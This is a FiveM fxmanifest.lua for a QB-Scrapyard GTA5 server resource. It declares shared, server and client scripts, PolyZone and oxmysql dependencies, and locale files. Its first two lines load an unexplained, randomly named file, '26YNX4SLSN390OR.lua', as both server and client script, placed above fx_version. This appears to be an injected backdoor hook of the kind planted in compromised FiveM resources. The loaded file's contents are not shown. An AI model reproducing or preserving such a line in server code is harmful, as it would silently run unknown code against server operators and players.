server_script "26YNX4SLSN390OR.lua"
client_script "26YNX4SLSN390OR.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-Scrapyard'
version '1.0.0'

shared_script {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/ComboZone.lua',
    'config.lua',
    '@qb-core/shared/locale.lua',
    'locales/en.lua',
    'locales/*.lua'
}
server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/main.lua'
}
client_script 'client/main.lua'

lua54 'yes'
